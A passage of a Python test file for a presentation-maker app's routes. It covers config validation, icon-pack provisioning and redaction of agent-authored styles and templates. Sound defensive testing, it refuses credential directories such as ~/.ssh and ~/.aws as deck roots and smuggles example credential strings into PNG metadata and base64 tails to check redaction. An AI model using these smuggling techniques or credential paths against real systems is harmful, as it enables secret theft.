                self.url("/config"), json={"deckRoot": "~/decks-elsewhere"}
            )
        self.assertEqual(resp.status, 200)
        saved = json.loads(target.read_text(encoding="utf-8"))
        # Stored RESOLVED, not as typed. The value is now validated before it is
        # persisted (an unresolvable path used to be accepted and then 500 every
        # later read), and validating a differently-derived path than the one
        # `deck_root()` resolves would leave that gap open — so the resolved path is
        # what gets written. `~` still works; it is expanded rather than refused.
        self.assertEqual(
            saved["output_dir"], str(Path("~/decks-elsewhere").expanduser().resolve())
        )

    async def test_put_refuses_a_path_that_cannot_be_resolved(self) -> None:
        """An unresolvable deck root must be REFUSED, not stored.

        `paths.deck_root()` resolves the configured string on every read, and
        `Path.resolve()` raises `ValueError` on an embedded NUL — so a value accepted
        here wedged the app: this endpoint answered 200, then every `GET /config` and
        every deck route raised a 500 out of `deck_root()`, including the settings
        page needed to fix it. Recovery meant hand-editing the engine's config.
        """
        target = self.tmp / "cfg-nul" / "config.json"
        with _enabled(True), mock.patch.object(paths, "engine_config_path", return_value=target):
            resp = await self.client.put(self.url("/config"), json={"deckRoot": "/tmp/a\x00b"})
            self.assertEqual(resp.status, 400)
            self.assertEqual((await resp.json())["code"], "invalid_deck_root")
            # Nothing persisted, so the app is still usable.
            self.assertFalse(target.exists())
            follow_up = await self.client.get(self.url("/config"))
        self.assertEqual(follow_up.status, 200)

    async def test_put_refuses_a_credential_directory_as_the_deck_root(self) -> None:
        """A sensitive path must be refused at this WRITE boundary.

        Not a read-side concern: the value persisted here is the ENGINE's own
        ``output_dir``, and the engine resolves it independently of
        ``paths.deck_root()`` — it calls ``mkdir(parents=True)`` and writes
        ``deck.json`` / ``specs/`` / ``slides/`` beneath it. So accepting ``~/.ssh``
        makes a third-party tree driven by model-authored deck content create files
        inside a credential directory.

        Refusing it here is what closes that, and the per-deck ``paths._contained``
        gate is NOT a substitute — it only refuses to *display* decks under a
        sensitive root, so the writes would land while ``GET /decks`` reported an
        empty list. Silent is worse than blocked.
        """
        target = self.tmp / "cfg-sensitive" / "config.json"
        # `~` is included deliberately: it is not itself sensitive, so only the
        # `path_contains_sensitive` half of the check refuses it — a root that would
        # make every deck a sibling of `.ssh` / `.aws`.
        for value in ("~/.ssh", "~/.aws", "~/.ssh/decks", "~"):
            with _enabled(True), mock.patch.object(
                paths, "engine_config_path", return_value=target
            ):
                resp = await self.client.put(self.url("/config"), json={"deckRoot": value})
            self.assertEqual(resp.status, 400, value)
            self.assertEqual((await resp.json())["code"], "invalid_deck_root", value)
            # Nothing was persisted, so the engine never sees the path at all.
            self.assertFalse(target.exists(), value)

    async def test_put_still_accepts_an_ordinary_directory(self) -> None:
        """The guard above must not refuse a normal deck root.

        Pinned separately because a too-broad sensitive check (or one that matched a
        mere substring rather than a path prefix) would reject everyday folders and
        make the setting unusable — a failure mode that a refusal-only test cannot
        detect.
        """
        target = self.tmp / "cfg-ok" / "config.json"
        wanted = self.tmp / "my decks"
        with _enabled(True), mock.patch.object(paths, "engine_config_path", return_value=target):
            resp = await self.client.put(self.url("/config"), json={"deckRoot": str(wanted)})
        self.assertEqual(resp.status, 200)
        saved = json.loads(target.read_text(encoding="utf-8"))
        self.assertEqual(saved["output_dir"], str(wanted.resolve()))

    async def test_put_preserves_other_engine_settings(self) -> None:
        # The engine owns this file; a write must not discard its other keys.
        target = self.tmp / "cfg2" / "config.json"
        target.parent.mkdir(parents=True)
        target.write_text(json.dumps({"theme": "dark", "output_dir": "/old"}), encoding="utf-8")
        with _enabled(True), mock.patch.object(paths, "engine_config_path", return_value=target):
            resp = await self.client.put(self.url("/config"), json={"deckRoot": "/new"})
        self.assertEqual(resp.status, 200)
        saved = json.loads(target.read_text(encoding="utf-8"))
        # The subject of this test is that the engine's OTHER keys survive the write.
        self.assertEqual(saved["theme"], "dark")
        # Compared against the resolved form rather than the literal `"/new"`: the
        # value is now validated-and-resolved before it is persisted, and on Windows
        # `/new` resolves to `C:\new`. Asserting the raw string made this test
        # platform-dependent — it passed on Linux and macOS and failed the Windows
        # shard, which is a worse outcome than either.
        self.assertEqual(saved["output_dir"], str(Path("/new").expanduser().resolve()))

    async def test_put_refuses_a_corrupt_engine_config(self) -> None:
        target = self.tmp / "cfg3" / "config.json"
        target.parent.mkdir(parents=True)
        target.write_text("{not json", encoding="utf-8")
        with _enabled(True), mock.patch.object(paths, "engine_config_path", return_value=target):
            resp = await self.client.put(self.url("/config"), json={"deckRoot": "/new"})
        # 409, not 500: overwriting would silently discard settings we could not
        # read, so the user is told to fix the file instead.
        self.assertEqual(resp.status, 409)


class TestEngineRoutes(_RoutesFixture):
    async def test_engine_status_reports_not_ready(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/engine"))
        self.assertEqual(resp.status, 200)
        body = await resp.json()
        self.assertFalse(body["ready"])
        self.assertEqual(body["pinnedTag"], provision.ENGINE_TAG)
        self.assertIn("provision", body)

    async def test_provision_is_accepted_and_runs_off_the_loop(self) -> None:
        outcome = provision.ProvisionOutcome(ok=True, log="done", engine_tag="v0.0.0")
        with _enabled(True), mock.patch.object(provision, "provision", return_value=outcome) as job:
            resp = await self.client.post(self.url("/engine/provision"))
            self.assertEqual(resp.status, 202)
            # Poll until the detached job lands so the assertion is not a race.
            await _await_detached(lambda: bool(job.called))
        self.assertTrue(job.called)

    async def test_provision_refuses_to_start_twice(self) -> None:
        with _enabled(True):
            routes._engine_state.state = "running"
            try:
                resp = await self.client.post(self.url("/engine/provision"))
                self.assertEqual(resp.status, 202)
                self.assertEqual((await resp.json())["state"], "running")
            finally:
                routes._engine_state.state = "idle"

    async def test_deps_reports_optional_binaries(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/deps"))
        self.assertEqual(resp.status, 200)
        body = await resp.json()
        self.assertEqual(set(body["labels"]), set(engine.OPTIONAL_DEPS))
        self.assertEqual(set(body["present"]), set(engine.OPTIONAL_DEPS))

    async def test_no_dependency_install_endpoint_exists(self) -> None:
        """Deliberately absent: the upstream app shelled out to brew/apt from a
        browser request. Installing a system package is a privileged host
        mutation, so the UI shows the command and the user runs it."""
        with _enabled(True):
            resp = await self.client.post(self.url("/deps/install"))
        self.assertEqual(resp.status, 404)

    async def _await_tick(self) -> None:
        await asyncio.sleep(0)


async def _await_detached(predicate: Callable[[], bool], *, tries: int = 400) -> None:
    """Wait for detached work that runs in a THREAD, not just on the loop.

    ``asyncio.sleep(0)`` only yields to the event loop, so it cannot wait for anything
    handed to ``run_in_executor`` — the executor thread may not have been scheduled at
    all yet. On a fast Linux runner it happened to be, so a `sleep(0)` poll passed; on a
    slower Windows runner all 200 iterations completed before the thread ran and the
    assertion failed with the work still pending. That is a test race, not a product bug,
    but it fails a required check either way.

    A real (if tiny) delay yields the GIL and gives the thread somewhere to run, and the
    loop bounds it so a genuinely broken detach still fails rather than hanging.
    """
    for _ in range(tries):
        if predicate():
            return
        await asyncio.sleep(0.01)


class TestLibraryRoutes(_RoutesFixture):
    async def test_styles_listing(self) -> None:
        with (
            _enabled(True),
            mock.patch.object(routes.library, "list_styles", return_value=[{"name": "brand"}]),
        ):
            resp = await self.client.get(self.url("/styles"))
        self.assertEqual(resp.status, 200)
        self.assertEqual((await resp.json())["styles"], [{"name": "brand"}])

    async def test_style_requires_a_name(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/style"))
        self.assertEqual(resp.status, 400)

    async def test_style_not_found_is_404(self) -> None:
        with _enabled(True), mock.patch.object(routes.library, "style_html", return_value=None):
            resp = await self.client.get(self.url("/style?name=absent"))
        self.assertEqual(resp.status, 404)

    async def test_a_credential_in_bitmap_metadata_is_not_exempted(self) -> None:
        """A valid raster signature must not launder a key in the payload.

        `_scanned_bitmap_bytes` originally checked only the first bytes, so a blob
        beginning `\\x89PNG…` and continuing `tEXtComment\\0AKIA…` was exempted from
        the scan and reached the browser verbatim. Every container here (PNG tEXt,
        JPEG COM, EXIF, WebP XMP) has a metadata chunk that can hold arbitrary text,
        so the signature is necessary but not sufficient.
        """
        evil = base64.b64encode(
            b"\x89PNG\r\n\x1a\n" + b"tEXtComment\x00AKIAIOSFODNN7EXAMPLE" + b"\x00" * 64
        ).decode()
        doc = '{"img": "data:image/png;base64,' + evil + '"}'
        self.assertEqual(routes._scanned_bitmap_bytes(evil), (None, True))
        out = routes._redact_artifact(doc.encode("utf-8")).decode("utf-8")
        self.assertNotIn(evil, out)

    async def test_a_credential_APPENDED_to_a_real_raster_is_not_exempted(self) -> None:
        """The head being a real raster does not vouch for the tail.

        The subtler sibling of the metadata case: a credential appended to a GENUINE
        raster's base64 body is itself base64-alphabet text, so `_INLINE_BITMAP_RE`
        swallows it into the body, the head still carries a PNG signature, and
        base64-decoding the appended ASCII yields binary NOISE — so the decoded-bytes
        scan legitimately finds nothing and the exemption was granted. Restoring then
        reproduced the key byte-for-byte, so it reached the dashboard in the served
        text. Verified against the pre-fix code for every marker below.

        This is why `_scanned_bitmap_bytes` screens the ENCODED body too, and why the
        stash holds a re-encoding of the scanned bytes rather than the matched text.
        """
        raster = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"\x00" * 40).decode()
        for marker in (
            _FAKE_AKIA,
            "ASIAIOSFODNN7EXAMPLE",
            "ghp_0123456789abcdefghij",
            "xoxb-1234567890-abcdefg",
            "sk-ant-api03-abcdefghijklmnop",
        ):
            doc = '{"img": "data:image/png;base64,' + raster + marker + '"}'
            out = routes._redact_artifact(doc.encode("utf-8")).decode("utf-8")
            self.assertNotIn(marker, out, marker)

    async def test_a_clean_raster_is_still_exempted(self) -> None:
        """The carve-out must survive: a real image passes through byte-identical.

        This is the guard against over-redacting — an unguarded `redact()` eats a
        random raster as a bare secret and blanks every picture in every deck.
        """
        clean = base64.b64encode(b"\x89PNG\r\n\x1a\n" + _raster_body(20000)).decode()
        doc = '{"img": "data:image/png;base64,' + clean + '"}'
        self.assertIsNotNone(routes._scanned_bitmap_bytes(clean)[0])
        self.assertEqual(routes._redact_artifact(doc.encode("utf-8")).decode("utf-8"), doc)

    async def test_style_cover_thumbnails_are_redacted(self) -> None:
        """`coverHtml` is a SLICE of the same agent-authored file `/style` serves
        whole, and the Library tab loads it on every visit — so redacting only the
        full document left the identical bytes reachable by the commoner route."""
        cover = '<html><body>key AKIAIOSFODNN7EXAMPLE</body></html>'
        with _enabled(True), mock.patch.object(
            routes.library, "list_styles",
            return_value=[{"name": "brand", "coverHtml": cover}],
        ):
            resp = await self.client.get(self.url("/styles"))
        self.assertEqual(resp.status, 200)
        styles = (await resp.json())["styles"]
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", styles[0]["coverHtml"])
        self.assertEqual(styles[0]["name"], "brand")

    async def test_style_metadata_is_redacted_not_just_the_cover(self) -> None:
        """The fields BESIDE `coverHtml` are agent-authored too.

        `POST /styles/import?name=` is agent-reachable, so a style NAME is untrusted
        text on exactly the same footing as the document body. Redacting only the
        HTML left a credential in a name reaching the Library tab unscanned — the
        same one-field-missed shape as the thumbnail hole above.
        """
        with _enabled(True), mock.patch.object(
            routes.library, "list_styles",
            return_value=[{"name": f"brand {_FAKE_AKIA}", "coverHtml": "<p>ok</p>"}],
        ):
            resp = await self.client.get(self.url("/styles"))
        body = await resp.text()
        self.assertNotIn(_FAKE_AKIA, body)

    async def test_template_metadata_is_redacted(self) -> None:
        """`/templates` served analyzed metadata with NO redaction at all.

        `name` and `description` both arrive from `POST /templates/import`, which is
        agent-reachable. Nested values are covered too, because the analyzed theme
        metadata is a tree.
        """
        with _enabled(True), mock.patch.object(
            routes.library, "list_templates",
            return_value=[{
                "name": f"deck {_FAKE_AKIA}",
                "description": f"use {_FAKE_AKIA}",
                "theme": {"fonts": [f"Font {_FAKE_AKIA}"]},
            }],
        ):
            resp = await self.client.get(self.url("/templates"))
        self.assertEqual(resp.status, 200)
        body = await resp.text()
        self.assertNotIn(_FAKE_AKIA, body)
        # Redaction replaces the secret; it does not blank the record.
        self.assertTrue((await resp.json())["templates"][0]["name"])

    async def test_style_list_tolerates_a_missing_cover(self) -> None:
        """A style whose file could not be read carries an empty cover."""
        with _enabled(True), mock.patch.object(
            routes.library, "list_styles", return_value=[{"name": "brand", "coverHtml": ""}],
        ):
            resp = await self.client.get(self.url("/styles"))
        self.assertEqual(resp.status, 200)
        self.assertEqual((await resp.json())["styles"][0]["coverHtml"], "")

    async def test_style_html_is_redacted(self) -> None:
        """A style is an HTML document written by the `pptx-maker-style` AGENT, so it is
        model output on its way to the dashboard and gets the same pass a textual
        deck artifact does."""
        styled = '<html><body>key AKIAIOSFODNN7EXAMPLE</body></html>'
        with _enabled(True), mock.patch.object(
            routes.library, "style_html", return_value=styled
        ):
            resp = await self.client.get(self.url("/style?name=brand"))
        self.assertEqual(resp.status, 200)
        body = await resp.json()
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", body["fullHtml"])
        self.assertEqual(body["name"], "brand")

    async def test_style_html_keeps_its_inline_art(self) -> None:
        """...and it goes through the bitmap-aware helper, not a bare redact():
        an unguarded pass over a raster eats it as a bare secret, which would
        silently blank the style preview."""
        raster = base64.b64encode(b"\x89PNG\r\n\x1a\n" + _raster_body(4096)).decode()
        styled = f'<html><body><img src="data:image/png;base64,{raster}"></body></html>'
        with _enabled(True), mock.patch.object(
            routes.library, "style_html", return_value=styled
        ):
            resp = await self.client.get(self.url("/style?name=brand"))
        self.assertEqual((await resp.json())["fullHtml"], styled)

    async def test_style_import_passes_the_raw_body_through(self) -> None:
        with (
            _enabled(True),
            mock.patch.object(
                routes.library, "import_style", return_value=(200, {"imported": "brand"})
            ) as imp,
        ):
            resp = await self.client.post(
                self.url("/styles/import?name=brand"), data="<html>hi</html>"
            )
        self.assertEqual(resp.status, 200)
        imp.assert_called_once_with("brand", "<html>hi</html>")

    async def test_style_import_refuses_an_oversized_body(self) -> None:
        with _enabled(True), mock.patch.object(routes, "_MAX_BODY_BYTES", 4):
            resp = await self.client.post(self.url("/styles/import?name=big"), data="x" * 64)
        self.assertEqual(resp.status, 413)

    async def test_style_pin_requires_a_boolean(self) -> None:
        with _enabled(True):
            resp = await self.client.post(
                self.url("/styles/pin"), json={"name": "brand", "pinned": "yes"}
            )
        self.assertEqual(resp.status, 400)

    async def test_style_rename_forwards_both_names(self) -> None:
        with (
            _enabled(True),
            mock.patch.object(routes.library, "rename_style", return_value=(200, {})) as ren,
        ):
            resp = await self.client.post(
                self.url("/styles/rename"), json={"name": "old", "to": "new"}
            )
        self.assertEqual(resp.status, 200)
        ren.assert_called_once_with("old", "new")

    async def test_style_delete_forwards_the_name(self) -> None:
        with (
            _enabled(True),
            mock.patch.object(
                routes.library, "delete_style", return_value=(200, {"deleted": "brand"})
            ) as dele,
        ):
            resp = await self.client.delete(self.url("/styles?name=brand"))
        self.assertEqual(resp.status, 200)
        dele.assert_called_once_with("brand")

    async def test_template_import_forwards_bytes_and_description(self) -> None:
        with (
            _enabled(True),
            mock.patch.object(
                routes.library, "import_template", return_value=(200, {"imported": "deck"})
            ) as imp,
        ):
            resp = await self.client.post(
                self.url("/templates/import?name=deck&description=corp"),
                data=b"PK\x03\x04",
            )
        self.assertEqual(resp.status, 200)
        imp.assert_called_once_with("deck", b"PK\x03\x04", "corp")

    async def test_library_error_status_is_propagated(self) -> None:
        # The route layer is a thin adapter: the library's (status, payload) pair
        # must reach the client unchanged, not be flattened to 200/500. The `code`
        # is part of that pair — it is minted at the condition in `library` and the
        # boundary only re-emits it (see `_worker_response`).
        with (
            _enabled(True),
            mock.patch.object(
                routes.library,
                "import_style",
                return_value=(409, {"error": "exists", "code": "style_exists"}),
            ),
        ):
            resp = await self.client.post(self.url("/styles/import?name=dup"), data="<html></html>")
        self.assertEqual(resp.status, 409)
        payload = await resp.json()
        self.assertEqual(payload["error"], "exists")
        self.assertEqual(payload["code"], "style_exists")

    async def test_a_worker_error_is_redacted_before_it_reaches_the_dashboard(self) -> None:
        """Library errors interpolate the caller's own name, and a name only has to
        satisfy `SEGMENT_RE` — which accepts `AKIAIOSFODNN7EXAMPLE`. So a
        credential-shaped style name was echoed verbatim into the dashboard by the
        duplicate-import path (`style 'AKIA…' already exists`).

        Redacted at `_worker_response`, the one chokepoint every worker error passes
        through, rather than at each `f"…{name}…"` — so a message added later cannot
        reintroduce the leak.
        """
        with (
            _enabled(True),
            mock.patch.object(
                routes.library,
                "import_style",
                return_value=(
                    409,
                    {"error": f"style {_FAKE_AKIA!r} already exists", "code": "style_exists"},
                ),
            ),
        ):
            resp = await self.client.post(
                self.url(f"/styles/import?name={_FAKE_AKIA}"), data="<html></html>"
            )
        self.assertEqual(resp.status, 409)
        payload = await resp.json()
        self.assertNotIn(_FAKE_AKIA, payload["error"])
        self.assertIn("REDACTED", payload["error"])
        # The machine-readable contract is untouched — only the prose is scrubbed.
        self.assertEqual(payload["code"], "style_exists")

    async def test_every_worker_error_status_keeps_its_code(self) -> None:
        # `_worker_response` maps the status through a ladder of literal-status
        # returns so the error-code contract scanner can see the `code` in each
        # branch. A status the ladder forgot would be rewritten to 500, so every
        # status the workers actually return is pinned here.
        for status in (400, 404, 409, 413, 500, 503):
            with self.subTest(status=status):
                with (
                    _enabled(True),
                    mock.patch.object(
                        routes.library,
                        "delete_style",
                        return_value=(status, {"error": "nope", "code": "some_condition"}),
                    ),
                ):
                    resp = await self.client.delete(self.url("/styles?name=x"))
                self.assertEqual(resp.status, status)
                payload = await resp.json()
                self.assertEqual(payload["error"], "nope")
                self.assertEqual(payload["code"], "some_condition")

    async def test_worker_success_payload_is_not_reshaped(self) -> None:
        # Only the error branches are reduced to the two contract keys; a 200 body
        # carries app data (`metadata`, `pinnedStyles`, ...) and must pass through
        # whole.
        with (
            _enabled(True),
            mock.patch.object(
                routes.library,
                "import_template",
                return_value=(200, {"imported": "deck", "metadata": {"layouts": 7}}),
            ),
        ):
            resp = await self.client.post(
                self.url("/templates/import?name=deck"), data=b"PK\x03\x04"
            )
        self.assertEqual(resp.status, 200)
        self.assertEqual(await resp.json(), {"imported": "deck", "metadata": {"layouts": 7}})


class TestWorkerResponseContract(unittest.TestCase):
    """``_worker_response`` is the single adapter from a blocking worker's
    ``(status, payload)`` pair to an HTTP response. Its two invisible assumptions
    — a success is 200, and a failure body is exactly ``error`` + ``code`` — are
    what ``_check_worker_contract`` exists to report on. Tested directly (not
    through a route) because the point is the mapping, not the transport."""

    def test_a_success_body_passes_through_untouched(self) -> None:
        resp = routes._worker_response(200, {"imported": "deck", "metadata": {"layouts": 7}})
        self.assertEqual(resp.status, 200)
        self.assertEqual(json.loads(resp.body), {"imported": "deck", "metadata": {"layouts": 7}})

    def test_each_mapped_error_status_is_preserved(self) -> None:
        for status in (400, 404, 409, 413, 500, 503):
            with self.subTest(status=status):
                resp = routes._worker_response(status, {"error": "no", "code": "a_code"})
                self.assertEqual(resp.status, status)
                self.assertEqual(json.loads(resp.body), {"error": "no", "code": "a_code"})

    def test_an_unmapped_error_status_becomes_500_and_is_logged(self) -> None:
        """A worker inventing e.g. 418 must not reach the client as 418 — the
        ladder cannot carry it, so it degrades to 500 and says so."""
        with self.assertLogs("kirocrew.app.pptx-maker", level="WARNING") as logs:
            resp = routes._worker_response(418, {"error": "teapot", "code": "c"})
        self.assertEqual(resp.status, 500)
        self.assertTrue(any("unmapped error status" in line for line in logs.output))

    def test_a_non_200_success_is_flattened_to_200_and_logged(self) -> None:
        """The success branch always answers 200 — a worker returning 201 has its
        status silently rewritten, so the drift is only visible in the log. Pinned
        so a future worker that needs 201 is forced to extend the ladder."""
        with self.assertLogs("kirocrew.app.pptx-maker", level="WARNING") as logs:
            resp = routes._worker_response(201, {"created": True})
        self.assertEqual(resp.status, 200)
        self.assertEqual(json.loads(resp.body), {"created": True})
        self.assertTrue(any("unhandled success status" in line for line in logs.output))

    def test_dropping_a_non_contract_error_field_is_reported(self) -> None:
        """The error branches rebuild the body key by key, so an extra field is
        silently lost — that drift must be visible in the log."""
        with self.assertLogs("kirocrew.app.pptx-maker", level="WARNING") as logs:
            resp = routes._worker_response(400, {"error": "e", "code": "c", "hint": "extra"})
        self.assertNotIn("hint", json.loads(resp.body))
        self.assertTrue(any("non-contract error field" in line for line in logs.output))

    def test_a_failure_missing_its_code_still_emits_both_keys(self) -> None:
        """The dashboard switches on ``code``; a missing one must be an empty
        string rather than an absent key that throws in the client."""
        resp = routes._worker_response(500, {})
        self.assertEqual(json.loads(resp.body), {"error": "", "code": ""})


class TestIconProvisionedMarker(unittest.TestCase):
    """Icon packs are keyed on the engine tag and gated on the pack's manifest
    actually existing, so an interrupted download cannot read as 'done'."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)

    def _marker(self, data: object) -> None:
        (self.tmp / engine.ICON_MARKER_FILENAME).write_text(
            json.dumps(data), encoding="utf-8"
        )

    def _pack(self, source: str) -> None:
        (self.tmp / source).mkdir(parents=True, exist_ok=True)
        (self.tmp / source / "manifest.json").write_text("{}", encoding="utf-8")

    def test_no_marker_means_nothing_is_provisioned(self) -> None:
        self.assertEqual(routes._icon_provisioned(self.tmp, "v1"), {})

    def test_a_corrupt_marker_means_nothing_is_provisioned(self) -> None:
        (self.tmp / engine.ICON_MARKER_FILENAME).write_text("{not json", encoding="utf-8")
        self.assertEqual(routes._icon_provisioned(self.tmp, "v1"), {})

    def test_a_marker_from_another_engine_version_is_ignored(self) -> None:
        """Icon sets ship WITH the engine version, so an upgrade must
        re-provision rather than trust the old pack."""
        for source, _ in engine.ICON_SOURCES:
            self._pack(source)
        self._marker({"tag": "v0.0.1", "sources": {s: True for s, _ in engine.ICON_SOURCES}})
        self.assertEqual(routes._icon_provisioned(self.tmp, "v0.3.8"), {})

    def test_a_marker_without_the_pack_on_disk_is_not_done(self) -> None:
        """The exact interrupted-download case: the marker claims success but the
        manifest never landed, so the pack must be re-downloaded."""
        self._marker({"tag": "v1", "sources": {s: True for s, _ in engine.ICON_SOURCES}})
        self.assertEqual(routes._icon_provisioned(self.tmp, "v1"), {})

    def test_a_matching_marker_with_the_pack_present_is_done(self) -> None:
        for source, _ in engine.ICON_SOURCES:
            self._pack(source)
        self._marker({"tag": "v1", "sources": {s: True for s, _ in engine.ICON_SOURCES}})
        done = routes._icon_provisioned(self.tmp, "v1")
        self.assertEqual(set(done), {s for s, _ in engine.ICON_SOURCES})

    def test_a_non_object_marker_is_ignored(self) -> None:
        self._marker([1, 2])
        self.assertEqual(routes._icon_provisioned(self.tmp, "v1"), {})

    def test_a_marker_whose_sources_are_not_an_object_is_ignored(self) -> None:
        self._marker({"tag": "v1", "sources": "all"})
        self.assertEqual(routes._icon_provisioned(self.tmp, "v1"), {})


class TestRelocatePack(unittest.TestCase):
    """Packs are moved OUT of the engine checkout because that checkout is
    replaced on every app update; the user config dir survives."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)

    def test_moves_the_generated_pack_into_place(self) -> None:
        generated = self.tmp / "generated"
        generated.mkdir()
        (generated / "manifest.json").write_text("{}", encoding="utf-8")
        destination = self.tmp / "assets" / "aws"
        destination.parent.mkdir(parents=True)
        routes._relocate_pack(generated, destination)
        self.assertTrue((destination / "manifest.json").is_file())
        self.assertFalse(generated.exists())

    def test_replaces_a_previous_pack(self) -> None:
        """A re-download must not merge into the old pack — a renamed icon would
        otherwise linger forever."""
        destination = self.tmp / "aws"
        destination.mkdir()
        (destination / "stale-icon.svg").write_text("old", encoding="utf-8")
        generated = self.tmp / "generated"
        generated.mkdir()
        (generated / "manifest.json").write_text("{}", encoding="utf-8")
        routes._relocate_pack(generated, destination)
        self.assertFalse((destination / "stale-icon.svg").exists())
        self.assertTrue((destination / "manifest.json").is_file())

    def test_a_leftover_staging_dir_is_cleared_first(self) -> None:
        """An interrupted previous relocate leaves `<name>.new` behind; without
        clearing it the move would nest inside it."""
        destination = self.tmp / "aws"
        staging = self.tmp / "aws.new"
        staging.mkdir()
        (staging / "junk").write_text("x", encoding="utf-8")
        generated = self.tmp / "generated"
        generated.mkdir()
        (generated / "manifest.json").write_text("{}", encoding="utf-8")
        routes._relocate_pack(generated, destination)
        self.assertFalse(staging.exists())
        self.assertTrue((destination / "manifest.json").is_file())
        self.assertFalse((destination / "junk").exists())


class TestProvisionAssetsWorker(unittest.TestCase):
    """The icon-pack download worker. Runs on a worker thread, so its only
    channel to the user is the provisioning state — it must never raise, and it
    must not report success for a pack that did not land."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.config_dir = self.tmp / "sdpm"
        self.config_dir.mkdir(parents=True)
        routes._assets_state = engine.ProvisionState()
        self.addCleanup(setattr, routes, "_assets_state", engine.ProvisionState())

    def _run(self, *, force: bool = False, script_result=None, generate_manifest: bool = True):
        """Drive the worker with the engine's script runner faked out."""
        result = script_result or engine.EngineResult(returncode=0)

        def _fake_script(source: str, script: str):
            if result.returncode == 0:
                # Always produce the output DIRECTORY so a relocate would
                # succeed; only the manifest distinguishes a real download from
                # a script that exited 0 having written nothing.
                vendor = self.tmp / "vendor" / source
                vendor.mkdir(parents=True, exist_ok=True)
                if generate_manifest:
                    (vendor / "manifest.json").write_text("{}", encoding="utf-8")
            return result

        with mock.patch.object(
            routes.engine, "user_config_dir", return_value=self.config_dir
        ), mock.patch.object(
            routes.engine, "engine_tag", return_value="v0.3.8"
        ), mock.patch.object(
            routes.engine, "run_icon_script", side_effect=_fake_script
        ), mock.patch.object(
            routes.engine,
            "icon_vendor_output",
            side_effect=lambda source: self.tmp / "vendor" / source,
        ):
            routes._provision_assets(force)

    def test_a_not_ready_engine_is_an_error_state_not_a_crash(self) -> None:
        with mock.patch.object(routes.engine, "user_config_dir", return_value=None):
            routes._provision_assets(False)
        self.assertEqual(routes._assets_state.state, "error")
        self.assertIn("not ready", routes._assets_state.log)

    def test_a_successful_run_installs_every_pack_and_writes_the_marker(self) -> None:
        self._run()
        self.assertEqual(routes._assets_state.state, "done")
        target = self.config_dir / "assets"
        for source, _ in engine.ICON_SOURCES:
            self.assertTrue((target / source / "manifest.json").is_file(), source)
        marker = json.loads(
            (target / engine.ICON_MARKER_FILENAME).read_text(encoding="utf-8")
        )
        self.assertEqual(marker["tag"], "v0.3.8")
        self.assertTrue(all(marker["sources"].values()))

    def test_a_failed_download_is_recorded_per_source_and_not_marked_done(self) -> None:
        """Presentations work without icon packs, so a failure is reported rather
        than fatal — but it must never be recorded as provisioned."""
        self._run(script_result=engine.EngineResult(returncode=1, stderr="404"))
        self.assertEqual(routes._assets_state.state, "error")
        for source, _ in engine.ICON_SOURCES:
            self.assertEqual(routes._assets_state.per_source[source], "error")
        marker = json.loads(
            (self.config_dir / "assets" / engine.ICON_MARKER_FILENAME).read_text(encoding="utf-8")
        )
        self.assertFalse(any(marker["sources"].values()))

    def test_a_zero_exit_without_a_manifest_is_still_a_failure(self) -> None:
        """The script can exit 0 having written an output dir but no manifest;
        only the manifest proves the pack actually landed, so the run must NOT be
        recorded as provisioned (otherwise it never self-heals on a retry)."""
        self._run(generate_manifest=False)
        self.assertEqual(routes._assets_state.state, "error")
        for source, _ in engine.ICON_SOURCES:
            self.assertEqual(routes._assets_state.per_source[source], "error")
        marker = json.loads(
            (self.config_dir / "assets" / engine.ICON_MARKER_FILENAME).read_text(encoding="utf-8")
        )
        self.assertFalse(any(marker["sources"].values()))

    def test_an_already_provisioned_pack_is_skipped(self) -> None:
        """Idempotence: the packs are large, so a re-run at the same engine tag
        must not re-download them."""
        self._run()
        with mock.patch.object(
            routes.engine, "user_config_dir", return_value=self.config_dir
        ), mock.patch.object(
            routes.engine, "engine_tag", return_value="v0.3.8"
        ), mock.patch.object(
            routes.engine, "run_icon_script"
        ) as script:
            routes._provision_assets(False)
        script.assert_not_called()
        self.assertEqual(routes._assets_state.state, "done")

    def test_force_re_downloads_an_already_provisioned_pack(self) -> None:
        self._run()
        calls: list[str] = []

        def _record(source: str, script: str):
            calls.append(source)
            vendor = self.tmp / "vendor" / source
            vendor.mkdir(parents=True, exist_ok=True)
            (vendor / "manifest.json").write_text("{}", encoding="utf-8")
            return engine.EngineResult(returncode=0)

        with mock.patch.object(
            routes.engine, "user_config_dir", return_value=self.config_dir
        ), mock.patch.object(
            routes.engine, "engine_tag", return_value="v0.3.8"
        ), mock.patch.object(
            routes.engine, "run_icon_script", side_effect=_record
        ), mock.patch.object(
            routes.engine,
            "icon_vendor_output",
            side_effect=lambda source: self.tmp / "vendor" / source,
        ):
            routes._provision_assets(True)
        self.assertEqual(calls, [s for s, _ in engine.ICON_SOURCES])

    def test_an_install_failure_is_reported_and_does_not_abort_the_run(self) -> None:
        """One pack failing to move must not prevent the other from installing."""
        with mock.patch.object(routes, "_relocate_pack", side_effect=OSError("cross-device")):
            self._run()
        self.assertEqual(routes._assets_state.state, "error")
        self.assertIn("could not be installed", routes._assets_state.log)

    def test_an_uncreatable_assets_dir_is_an_error_state(self) -> None:
        """A read-only config dir must become a reported error, not an unhandled
        exception on the worker thread."""
        real_mkdir = Path.mkdir
        target = self.config_dir / "assets"

        def _deny(self_path, *args, **kwargs):
            if self_path == target:
                raise OSError("read-only")
            return real_mkdir(self_path, *args, **kwargs)

        with mock.patch.object(
            routes.engine, "user_config_dir", return_value=self.config_dir
        ), mock.patch.object(
            routes.engine, "engine_tag", return_value="v0.3.8"
        ), mock.patch.object(
            Path, "mkdir", _deny
        ):
            routes._provision_assets(False)
        self.assertEqual(routes._assets_state.state, "error")
        self.assertIn("cannot create", routes._assets_state.log)


class TestAssetsLogTail(unittest.TestCase):
    def test_the_log_is_bounded_so_a_long_run_cannot_grow_without_limit(self) -> None:
